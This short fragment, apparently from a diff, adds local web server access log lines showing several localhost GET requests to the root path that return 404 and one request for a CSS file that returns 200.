+INFO:     127.0.0.1:60570 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:55374 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49780 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46816 - "GET /css/index.e9a2e66b.css HTTP/1.1" 200 OK
